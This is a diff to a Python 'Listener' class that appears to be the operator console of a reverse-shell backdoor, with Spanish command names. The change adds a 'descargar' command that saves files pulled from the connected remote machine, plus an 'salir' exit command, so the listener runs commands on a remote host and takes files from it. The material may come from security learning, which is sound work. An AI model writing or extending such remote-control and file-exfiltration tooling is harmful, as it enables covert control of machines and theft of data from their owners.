@@ -29,17 +29,32 @@ class Listener:
             except ValueError:
                 continue
 
+    def escribir_archivo(self, path, content):
+        with open(path, "wb") as file:
+            file.write(content)
+            return "[+] Descarga completa."
+
 
     def ejecutar_remoto(self, command):
         self.reliable_send(command)
+
+        if command[0] == "salir":
+            self.connection.close()
+            exit()
+
         return self.reliable_recieve()
     
     
     def run(self):
         while True:
             #python 2.*: raw_input(); python 3.*: input() 
-            command = input("Shell>>")
+            command = input(">>")
+            command = command.split(" ")
             result = self.ejecutar_remoto(command)
+
+            if command[0] == "descargar":
+                result = self.escribir_archivo(command[1], result)
+
             print(result)
 
 
